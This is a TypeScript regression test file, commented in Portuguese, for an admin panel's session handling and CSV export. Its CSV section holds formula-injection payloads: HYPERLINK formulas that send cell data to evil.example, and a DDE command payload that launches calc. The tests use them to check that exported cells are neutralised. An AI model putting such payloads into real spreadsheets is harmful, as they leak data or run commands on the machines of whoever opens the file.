// Regressões de segurança do painel (src/): regras da sessão no navegador e exportação CSV.
//
// O código do painel roda aqui no Node: o store real (src/lib/store.ts, modo API), o cliente
// real (src/lib/api.ts) e as regras de src/domain/auth-state.ts (as mesmas que o
// ApiSessionProvider usa) falam com o servidor de teste por um fetch que encaminha para
// app.inject e guarda o cookie de sessão como o navegador (um cookie para todas as abas).
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import type { FastifyInstance } from 'fastify'
import type { MeResponse, TwoFactorEnableResponse, TwoFactorSetupResponse } from '@shared/api'
import {
  FOCUS_RECHECK_MS,
  PENDING_LOGOUT_MESSAGE,
  focusRecheckDue,
  isLogoutPending,
  logoutFailureText,
  mustResetStore,
  requestLogout,
  resolveSession,
  transition,
  type AuthStatus,
  type FlagStorage,
  type SessionIo,
  type StoreResetOptions,
} from '@/domain/auth-state'
import { csvCell as panelCsvCell, toCsv } from '@/lib/csv-format'
import { SECURITY } from '../src/config'
import { totpCode } from '../src/lib/totp'
import { csvCell as serverCsvCell } from '../src/modules/audit/format'
import { api as call, createTestApp, createUser, sessionCookie } from './helpers'

// Importados em tempo de execução (especificador em variável): o tsc do servidor não tem os
// tipos do navegador (DOM, import.meta.env) que estes arquivos usam.
interface StoreModule {
  dbGet<T>(key: string, seed: T): T
  prefetchKeys(keys: string[]): void
  refreshKey(key: string): Promise<void>
  dbSet<T>(key: string, next: T, seed?: T): void
  resetDb(opts?: { notify?: boolean; serverDataOnly?: boolean }): void
}
interface ApiModule {
  api<T>(method: 'GET' | 'POST' | 'PUT' | 'DELETE', path: string, body?: unknown): Promise<T>
  isApiMode(): boolean
}
const STORE_MODULE = '@/lib/store'
const API_MODULE = '@/lib/api'

let app: FastifyInstance
let store: StoreModule
let client: ApiModule

/** cookie de sessão do "navegador" (o mesmo para todas as abas) */
let jar: string | null = null
/** simula falha de rede em pedidos escolhidos (ex.: só o POST /api/auth/logout) */
let dropRequest: ((method: string, url: string) => boolean) | null = null

async function browserFetch(input: string | URL | Request, init: RequestInit = {}): Promise<Response> {
  const url = String(input)
  const method = (init.method ?? 'GET').toUpperCase() as 'GET' | 'POST' | 'PUT' | 'DELETE'
  if (dropRequest?.(method, url)) throw new TypeError('Failed to fetch')
  const res = await app.inject({
    method,
    url,
    remoteAddress: '127.0.0.1',
    headers: { ...((init.headers as Record<string, string> | undefined) ?? {}), ...(jar ? { cookie: jar } : {}) },
    payload: typeof init.body === 'string' ? init.body : undefined,
  })
  // Set-Cookie (login, logout) atualiza o cookie como o navegador faria
  const set = res.cookies.find((c) => c.name === SECURITY.sessionCookie)
  if (set) jar = set.value ? `${set.name}=${set.value}` : null
  return new Response(res.statusCode === 204 ? null : res.body, {
    status: res.statusCode,
    headers: { 'content-type': String(res.headers['content-type'] ?? 'application/json') },
  })
}

class MemoryStorage implements FlagStorage {
  private data = new Map<string, string>()
  getItem(k: string) {
    return this.data.get(k) ?? null
  }
  setItem(k: string, v: string) {
    this.data.set(k, v)
  }
  removeItem(k: string) {
    this.data.delete(k)
  }
}

/**
 * Uma aba do painel: o estado da sessão e a mesma sequência do ApiSessionProvider (resolveSession → transition).
 * `mounted`: chaves lidas pelas telas abertas; como no useSyncExternalStore, um aviso do store faz a tela reler.
 */
function openTab(keys: string[], storage: FlagStorage | null = null, mounted: string[] = []) {
  const io: SessionIo = {
    getMe: () => client.api<MeResponse>('GET', '/api/auth/me'),
    postLogout: () => client.api<void>('POST', '/api/auth/logout'),
    storage,
  }
  const tab = {
    status: { kind: 'loading' } as AuthStatus,
    io,
    async reload() {
      const r = await resolveSession(() => tab.status, io)
      const resetStore = (o: StoreResetOptions) => {
        store.resetDb(o)
        if (o.notify) for (const k of mounted) store.dbGet(k, [])
      }
      tab.status = transition(tab.status, r.next, keys, { resetStore, prefetch: store.prefetchKeys })
      return { ...r, status: tab.status }
    },
  }
  return tab
}

/** Primeira leitura de uma chave como a tela faz (sem nada em memória): busca e espera o servidor. */
async function loadFresh<T>(key: string, seed: T): Promise<T> {
  store.dbGet(key, seed)
  await store.refreshKey(key) // chave ainda não materializada: só espera a leitura em andamento
  return store.dbGet(key, seed)
}

beforeAll(async () => {
  app = await createTestApp()
  // modo API do painel; DEV desligado (o store só usa `window` para uma lista de chaves de depuração)
  vi.stubEnv('VITE_API_MODE', '1')
  vi.stubEnv('DEV', false)
  vi.stubGlobal('fetch', browserFetch)
  client = (await import(/* @vite-ignore */ API_MODULE)) as ApiModule
  store = (await import(/* @vite-ignore */ STORE_MODULE)) as StoreModule
  expect(client.isApiMode()).toBe(true)
})

afterAll(async () => {
  vi.unstubAllGlobals()
  vi.unstubAllEnvs()
  await app.close()
})

beforeEach(() => {
  jar = null
  dropRequest = null
  store.resetDb()
})

// ---------------------------------------------------------------------------
// r1: o cache do store sobrevivia a uma troca de pessoa que passa por uma etapa do login
// ---------------------------------------------------------------------------

function me(id: string, stage: MeResponse['stage'], permissions?: string[], roleId = 'superadmin'): MeResponse {
  return {
    stage,
    user: { id, name: id, email: `${id}@x.com`, roleId, twoFactor: false, lastAccess: null } as unknown as MeResponse['user'],
    ...(permissions ? { permissions, role: { id: roleId } as MeResponse['role'] } : {}),
  }
}

describe('sessão do painel: memória (store) por pessoa e por sessão', () => {
  it('superadmin → etapa 2FA de outra pessoa → painel dela: nada lido por A sobra em memória para B', async () => {
    const a = await createUser(app, { roleId: 'superadmin', name: 'Pessoa A' })
    const b = await createUser(app, { roleId: 'financeiro', name: 'Pessoa B', totp: true })
    const keys = ['auditoria.registros', 'equipe.membros']
    // a aba de A está com a Auditoria e a Equipe abertas
    const tab = openTab(keys, null, keys)

    // A entra e abre a auditoria e a equipe (o store guarda o que o servidor mostra para A)
    jar = await sessionCookie(app, a.id, 'active')
    expect((await tab.reload()).status.kind).toBe('active')
    await client.api('POST', '/api/audit/events', { action: 'editar', entity: 'Teste', summary: 'registro que só A pode ver' })
    const auditA = await loadFresh<unknown[]>('auditoria.registros', [])
    expect(JSON.stringify(auditA)).toContain('registro que só A pode ver')
    expect((await loadFresh<unknown[]>('equipe.membros', [])).length).toBeGreaterThanOrEqual(2)

    // em outra aba (mesmo cookie), B digita a senha e chega ao 2FA; a aba de A confere /me ao ganhar foco
    jar = await sessionCookie(app, b.id, '2fa')
    const step = await tab.reload()
    expect(step.status).toMatchObject({ kind: 'step', me: { stage: '2fa', user: { id: b.id } } })
    // uma leitura perdida durante a etapa (o servidor responde 403 etapa_pendente) não pode valer para a sessão de B
    expect(store.dbGet<unknown[]>('equipe.membros', [])).toEqual([])
    await store.refreshKey('equipe.membros')

    // B digita o código nesta aba e a sessão fica ativa
    await client.api('POST', '/api/auth/2fa/verify', { code: totpCode(b.totpSecret!, Date.now()) })
    expect((await tab.reload()).status).toMatchObject({ kind: 'active', me: { user: { id: b.id } } })

    // a tela lê da memória (useDb não busca de novo o que já está lá): nada de A pode estar lá
    expect(JSON.stringify(store.dbGet<unknown[]>('auditoria.registros', []))).not.toContain('registro que só A pode ver')
    // depois da leitura com a sessão de B, vale o que o servidor mostra para B
    expect((await call(app, 'GET', '/api/kv/auditoria.registros', { cookie: jar! })).statusCode).toBe(403)
    expect(await loadFresh<unknown[]>('auditoria.registros', [])).toEqual([])
    const teamForB = await call(app, 'GET', '/api/kv/equipe.membros', { cookie: jar! })
    const expectedTeam = teamForB.statusCode === 200 ? teamForB.json().value : []
    expect(await loadFresh<unknown[]>('equipe.membros', [])).toEqual(expectedTeam)
  })

  it('decide pela identidade, em qualquer etapa', () => {
    const full = ['equipe.ver', 'auditoria.ver']
    const activeA = { kind: 'active', me: me('A', 'active', full) } as const
    expect(mustResetStore(activeA, { kind: 'step', me: me('B', '2fa') })).toBe(true) // outra pessoa numa etapa
    expect(mustResetStore(activeA, { kind: 'active', me: me('B', 'active', full) })).toBe(true) // outra pessoa
    expect(mustResetStore(activeA, { kind: 'step', me: me('A', '2fa') })).toBe(true) // re-login: sessão nova
    expect(mustResetStore(activeA, { kind: 'login', reason: 'logout' })).toBe(true)
    expect(mustResetStore({ kind: 'step', me: me('A', '2fa') }, { kind: 'login', reason: 'expired' })).toBe(true)
    expect(mustResetStore(activeA, { kind: 'active', me: me('A', 'active', ['equipe.ver']) })).toBe(true) // perdeu permissão
    expect(mustResetStore(activeA, { kind: 'active', me: me('A', 'active', full, 'financeiro') })).toBe(true) // outro cargo
    // mesma pessoa, mesmas permissões (em outra ordem): mantém
    expect(mustResetStore(activeA, { kind: 'active', me: me('A', 'active', [...full].reverse()) })).toBe(false)
    // etapa → painel da mesma pessoa, e a abertura do painel: nada a apagar (preferências locais ficam)
    expect(mustResetStore({ kind: 'step', me: me('A', '2fa') }, activeA)).toBe(false)
    expect(mustResetStore({ kind: 'loading' }, activeA)).toBe(false)
  })

  it('apaga a memória antes do prefetch (nada da sessão anterior serve de cache para a nova)', () => {
    const calls: string[] = []
    const fx = {
      resetStore: (o: StoreResetOptions) => calls.push(o.serverDataOnly ? 'reset(servidor)' : o.notify ? 'reset+notify' : 'reset'),
      prefetch: (k: string[]) => calls.push(`prefetch:${k.join(',')}`),
    }
    const next = transition(
      { kind: 'active', me: me('A', 'active', ['auditoria.ver', 'saques.ver']) },
      { kind: 'active', me: me('B', 'active', ['saques.ver']) },
      ['operacao.saques', 'auditoria.registros'],
      fx,
    )
    expect(next.kind).toBe('active')
    // apaga primeiro (as telas continuam montadas e releem com a sessão nova); depois busca só o que o cargo novo pode ler
    expect(calls).toEqual(['reset+notify', 'prefetch:operacao.saques'])

    // indo para uma etapa do login ou para a entrada: apaga sem avisar as telas que vão sair
    // (relendo agora, buscariam com a sessão de transição e guardariam 403/401 para a próxima sessão)
    calls.length = 0
    transition({ kind: 'active', me: me('A', 'active', ['saques.ver']) }, { kind: 'step', me: me('B', '2fa') }, ['operacao.saques'], fx)
    transition({ kind: 'active', me: me('A', 'active', ['saques.ver']) }, { kind: 'login', reason: 'logout' }, ['operacao.saques'], fx)
    expect(calls).toEqual(['reset', 'reset'])

    // toda sessão aberta (depois da entrada, de uma etapa ou ao abrir a página) começa sem dados do servidor
    calls.length = 0
    transition({ kind: 'step', me: me('B', '2fa') }, { kind: 'active', me: me('B', 'active', ['saques.ver']) }, ['operacao.saques'], fx)
    transition({ kind: 'loading' }, { kind: 'active', me: me('B', 'active', ['saques.ver']) }, ['operacao.saques'], fx)
    expect(calls).toEqual(['reset(servidor)', 'prefetch:operacao.saques', 'reset(servidor)', 'prefetch:operacao.saques'])
  })
})

describe('sessão do painel: abrir a sessão mantém as preferências locais', () => {
  it('dados do servidor saem, preferência local (localStorage) fica', async () => {
    const u = await createUser(app, { roleId: 'superadmin' })
    store.dbSet('cassino.jogos.visao', 'grade') // chave local (shared/kv-registry LOCAL_ONLY_PREFIXES)
    jar = await sessionCookie(app, u.id, 'active')
    const tab = openTab(['equipe.membros'])
    expect((await tab.reload()).status.kind).toBe('active')
    expect(store.dbGet('cassino.jogos.visao', 'lista')).toBe('grade')
  })
})

// ---------------------------------------------------------------------------
// r1: códigos de recuperação sumiam com a conferência de /me ao voltar para a aba
// ---------------------------------------------------------------------------

describe('sessão do painel: códigos de recuperação do 2FA', () => {
  it('depois de /2fa/enable o servidor já diz "active", mas nenhuma conferência de fundo troca a tela', async () => {
    const u = await createUser(app, { roleId: 'financeiro', name: 'Pessoa Enroll' })
    jar = await sessionCookie(app, u.id, 'enroll')
    const tab = openTab([])
    expect((await tab.reload()).status).toMatchObject({ kind: 'step', me: { stage: 'enroll' } })
    const loadedAt = Date.now()

    const setup = await client.api<TwoFactorSetupResponse>('POST', '/api/auth/2fa/setup')
    const enabled = await client.api<TwoFactorEnableResponse>('POST', '/api/auth/2fa/enable', { code: totpCode(setup.secret, Date.now()) })
    expect(enabled.recoveryCodes.length).toBeGreaterThan(0)
    // a condição do bug: /me já mudou para 'active' enquanto a tela mostra os códigos
    expect((await client.api<MeResponse>('GET', '/api/auth/me')).stage).toBe('active')

    // a pessoa sai da janela para guardar os códigos e volta mais de 30 s depois
    const back = { status: tab.status, visible: true, busy: false, lastCheck: loadedAt, now: loadedAt + FOCUS_RECHECK_MS + 1_000 }
    expect(focusRecheckDue({ ...back, held: true })).toBe(false) // códigos na tela
    expect(focusRecheckDue({ ...back, held: false })).toBe(false) // etapa do login: nunca confere por baixo
    // só depois de "Continuar para o painel" (releaseRecoveryCodes → reload)
    expect((await tab.reload()).status.kind).toBe('active')
  })

  it('a conferência ao voltar para a aba só vale para a sessão ativa, sem códigos na tela e a cada 30 s desde a última leitura', () => {
    const active: AuthStatus = { kind: 'active', me: me('A', 'active', []) }
    const base = { status: active, visible: true, busy: false, held: false, lastCheck: 0, now: FOCUS_RECHECK_MS }
    expect(focusRecheckDue(base)).toBe(true)
    expect(focusRecheckDue({ ...base, now: FOCUS_RECHECK_MS - 1 })).toBe(false)
    expect(focusRecheckDue({ ...base, held: true })).toBe(false)
    expect(focusRecheckDue({ ...base, busy: true })).toBe(false)
    expect(focusRecheckDue({ ...base, visible: false })).toBe(false)
    expect(focusRecheckDue({ ...base, status: { kind: 'step', me: me('A', '2fa') } })).toBe(false)
    expect(focusRecheckDue({ ...base, status: { kind: 'login' } })).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// r1: "Você saiu do painel" com a sessão ainda valendo no servidor
// ---------------------------------------------------------------------------

describe('sessão do painel: sair só com a confirmação do servidor', () => {
  it('logout que não chega ao servidor: não conta como saída, e a próxima abertura do painel tenta sair de novo antes de entrar', async () => {
    const u = await createUser(app, { roleId: 'financeiro', name: 'Pessoa Turno' })
    const storage = new MemoryStorage()
    jar = await sessionCookie(app, u.id, 'active')
    const sessionCookieValue = jar
    const tab = openTab([], storage)
    expect((await tab.reload()).status.kind).toBe('active')

    // só o POST /api/auth/logout falha (rede); a pessoa clica em "Sair"
    dropRequest = (method, url) => method === 'POST' && url === '/api/auth/logout'
    const r = await requestLogout(tab.io)
    expect(r.ended).toBe(false)
    if (!r.ended) expect(logoutFailureText(r.error)).toContain('continua aberta')
    expect(isLogoutPending(storage)).toBe(true)
    // a sessão continua valendo no servidor: a tela não pode dizer que saiu
    expect((await call(app, 'GET', '/api/auth/me', { cookie: sessionCookieValue })).statusCode).toBe(200)

    // a próxima pessoa recarrega a página (o logout ainda falha): o painel não abre com a sessão anterior
    const reopened = openTab([], storage)
    const again = await reopened.reload()
    expect(again.status).toEqual({ kind: 'offline', message: PENDING_LOGOUT_MESSAGE })

    // a rede volta: a abertura conclui a saída antes de confiar em /me
    dropRequest = null
    const done = await reopened.reload()
    expect(done.status).toEqual({ kind: 'login', reason: 'logout' })
    expect(done.loggedOut).toBe(true)
    expect(isLogoutPending(storage)).toBe(false)
    expect((await call(app, 'GET', '/api/auth/me', { cookie: sessionCookieValue })).statusCode).toBe(401)
  })

  it('logout confirmado (204) encerra a sessão e limpa a marca', async () => {
    const u = await createUser(app, { roleId: 'financeiro' })
    const storage = new MemoryStorage()
    jar = await sessionCookie(app, u.id, 'active')
    const cookie = jar
    const tab = openTab([], storage)
    await tab.reload()
    expect(await requestLogout(tab.io)).toEqual({ ended: true })
    expect(isLogoutPending(storage)).toBe(false)
    expect((await call(app, 'GET', '/api/auth/me', { cookie })).statusCode).toBe(401)
  })

  it('só 2xx e 401 contam como saída; 5xx e 403 de IP deixam a sessão aberta', async () => {
    const storage = new MemoryStorage()
    const fail = (status: number, code: string) => () => Promise.reject(Object.assign(new Error(code), { status, code }))
    expect(await requestLogout({ postLogout: fail(401, 'nao_autenticado'), storage })).toEqual({ ended: true })
    expect(isLogoutPending(storage)).toBe(false)
    for (const [status, code] of [
      [500, 'erro_interno'],
      [503, 'indisponivel'],
      [403, 'ip_nao_autorizado'],
      [0, 'sem_conexao'],
    ] as const) {
      const r = await requestLogout({ postLogout: fail(status, code), storage })
      expect(r.ended, `${status} ${code}`).toBe(false)
      expect(isLogoutPending(storage)).toBe(true)
    }
    expect(logoutFailureText({ status: 403, code: 'ip_nao_autorizado' })).toContain('IP')
  })
})

// ---------------------------------------------------------------------------
// r1-frontend-5: exportação CSV do painel neutraliza fórmulas de planilha
// (antes: server/test/poc-r1-frontend-5.test.ts)
// ---------------------------------------------------------------------------

const FORMULA_NICK = '=HYPERLINK("https://evil.example/c?d="&A2&B2,"Ver detalhes")'
const FORMULA_TAG = '=HYPERLINK("//e.co/?"&B2&C2,"ver")'
const FORMULA_CODE = '=HYPERLINK("https://evil.example/?"&A3,"X")'
/** célula (com ou sem aspas) que a planilha avaliaria como fórmula */
const dangerous = /^"?[\s ]*[=+\-@\t\r＝＋－＠]/

function cellsOf(csv: string): string[][] {
  // CSV simples com ";" (sem ";" dentro dos valores deste teste)
  return csv.split('\r\n').map((l) => l.split(';'))
}

/** valor da célula como a planilha lê (sem as aspas do CSV) */
function unquote(cell: string) {
  return cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell
}

describe('exportação CSV do painel (src/lib/csv)', () => {
  it('apelido, etiqueta, código de cupom e jogador do saque com fórmula saem como texto', () => {
    // mesmas colunas do painel: Usuarios.tsx (nickname, tags), Cupons.tsx (code via sortValue), Saques.tsx (playerName via sortValue)
    const players = [{ id: '1001', nickname: FORMULA_NICK, tags: [FORMULA_TAG] }]
    const usuariosCsv = toCsv(players, [
      { header: 'ID', value: (p) => p.id },
      { header: 'Apelido', value: (p) => p.nickname },
      { header: 'Etiquetas', value: (p) => p.tags.join(', ') },
    ])
    const cuponsCsv = toCsv([{ code: FORMULA_CODE }], [{ header: 'Código', value: (c) => c.code }])
    const saquesCsv = toCsv([{ playerName: '@SUM(1+1)*cmd|\' /C calc\'!A0', amount: -150.5 }], [
      { header: 'Jogador', value: (w) => w.playerName },
      { header: 'Valor', value: (w) => w.amount },
    ])

    const [, playerRow] = cellsOf(usuariosCsv)
    const [, couponRow] = cellsOf(cuponsCsv)
    const [, saqueRow] = cellsOf(saquesCsv)
    expect(playerRow[1]).not.toMatch(dangerous)
    expect(playerRow[2]).not.toMatch(dangerous)
    expect(couponRow[0]).not.toMatch(dangerous)
    expect(saqueRow[0]).not.toMatch(dangerous)
    // o texto continua inteiro (só ganha o apóstrofo na frente)
    expect(unquote(playerRow[1])).toBe(`'${FORMULA_NICK}`)
    // números de verdade não mudam (valor negativo continua número)
    expect(saqueRow[1]).toBe('-150,5')
    // mesmo comportamento do CSV da auditoria no servidor
    expect(serverCsvCell(FORMULA_NICK)).not.toMatch(dangerous)
  })

  it('neutraliza = + - @ tabulação, CR, largura total e espaços antes; mantém números e aspas', () => {
    for (const payload of ['=1+1', '+1+1', '-1+A1', '@SUM(A1:A2)', '\t=1+1', '\r=1+1', '＝1+1', '＋1', '－1+A1', '＠A1', ' =1+1', ' =1']) {
      const cell = panelCsvCell(payload)
      expect(cell, JSON.stringify(payload)).not.toMatch(dangerous)
      expect(unquote(cell).startsWith("'"), JSON.stringify(payload)).toBe(true)
    }
    // números e texto numérico: nada muda
    expect(panelCsvCell(-10.5)).toBe('-10,5')
    expect(panelCsvCell(1234.5)).toBe('1.234,5')
    expect(panelCsvCell('-10,50')).toBe('-10,50')
    expect(panelCsvCell('+5')).toBe('+5')
    expect(panelCsvCell('-3.5%')).toBe('-3.5%')
    // texto comum e aspas/separador como antes
    expect(panelCsvCell('Maria Silva')).toBe('Maria Silva')
    expect(panelCsvCell('a;b')).toBe('"a;b"')
    expect(panelCsvCell('=A1;"x"')).toBe(`"'=A1;""x"""`)
    expect(panelCsvCell(null)).toBe('')
    expect(panelCsvCell(undefined)).toBe('')
  })
})
